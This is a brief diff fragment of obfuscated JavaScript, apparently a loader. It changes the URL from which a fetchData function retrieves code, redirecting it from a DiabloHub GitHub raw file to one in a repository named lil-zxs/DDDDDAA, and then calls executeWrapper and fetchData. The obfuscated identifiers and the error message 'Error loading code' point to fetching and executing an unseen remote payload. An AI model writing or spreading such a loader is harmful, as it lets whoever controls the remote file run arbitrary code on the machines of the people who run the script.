@@ -43,6 +43,6 @@ async function fetchData(_0x1c7d4f) {
     console.error("Error loading code:", _0x1853e8);
   }
 }
-const pastebinUrl = "https://raw.githubusercontent.com/DiabloHub/DiabloHub/main/new";
+const pastebinUrl = "https://raw.githubusercontent.com/lil-zxs/DDDDDAA/main/D";
 executeWrapper();
 fetchData(pastebinUrl);
